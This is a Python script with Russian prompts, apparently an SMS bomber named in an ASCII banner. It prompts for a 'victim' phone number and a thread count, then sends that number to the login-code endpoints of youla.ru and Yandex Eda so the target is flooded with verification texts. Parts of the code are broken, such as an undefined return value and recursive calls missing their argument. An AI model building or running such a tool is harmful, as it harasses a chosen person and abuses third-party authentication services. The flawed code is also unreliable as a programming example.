import requests
import time
import colorama
import os
import threading
#import socks
#import socket
import urllib.request
import zipfile
import random
import datetime
import sys
import re
import json
from colorama import Fore, Back
from threading import Thread
from random import randint
import asyncio
from requests import get

logo = ("""
 #####  ###  #####     #    ######     #     #####   #####    ###     #
#     #  #  #     #   # #   #     #   # #   #     # #     #  #   #   ##
#        #  #        #   #  #     #  #   #        #       # #     # # #
#        #  #       #     # #     # #     #  #####   #####  #     #   #
#        #  #       ####### #     # #######       #       # #     #   #
#     #  #  #     # #     # #     # #     # #     # #     #  #   #    #
 #####  ###  #####  #     # ######  #     #  #####   #####    ###   #####""")


print(logo)
ip = get('https://api.ipify.org').text
print('\n\n Ваш  IP address is: {}'.format(ip))


colorama.init()


 
 
thr = 1
thr = int(input("\n\n Введите количество потоков: "))

def mask(str, maska):
  if len(str) == maska.count('#'):
    str_list = list(str)
    for i in str_list:
      maska=maska.replace("#", i, 1)
    return maska0


print ('\n \n   Введите номер жертвы: (3XXXXXXXXX)')
phone = input ('\n\n    >>>   ')


def sms(counet):
  if len(phone) == 11 or len(phone) == 12 or len(phone) == 13:
    pass
    phone9 = phone[1:]
  else:
    print ("[!] Неправильный номер.")
    sms()
  while 1>0:
    try:      
      requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
      print('sms отправлено')
    except:
      pass
    try:      
      requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
      print('sms отправлено')
    except:
      pass
    break
    pass
for i in range(thr):
    t = threading.Thread(target= sms, args=(i, ), )
    try:
        t.start()
        print(f"Поток {i} запущен!")
        time.sleep(3)
    except Exception as e:
        print(f"Ошибка <{e}> поток `{i}`")
        sms()
      


colorama.init()
logo = '''
 #####  ###  #####     #    ######     #     #####   #####    ###     #
#     #  #  #     #   # #   #     #   # #   #     # #     #  #   #   ##
#        #  #        #   #  #     #  #   #        #       # #     # # #
#        #  #       #     # #     # #     #  #####   #####  #     #   #
#        #  #       ####### #     # #######       #       # #     #   #
#     #  #  #     # #     # #     # #     # #     # #     #  #   #    #
 #####  ###  #####  #     # ######  #     #  #####   #####    ###   #####'''
input("\n Для выхода нажми Enter")
sys.exit()
sms()

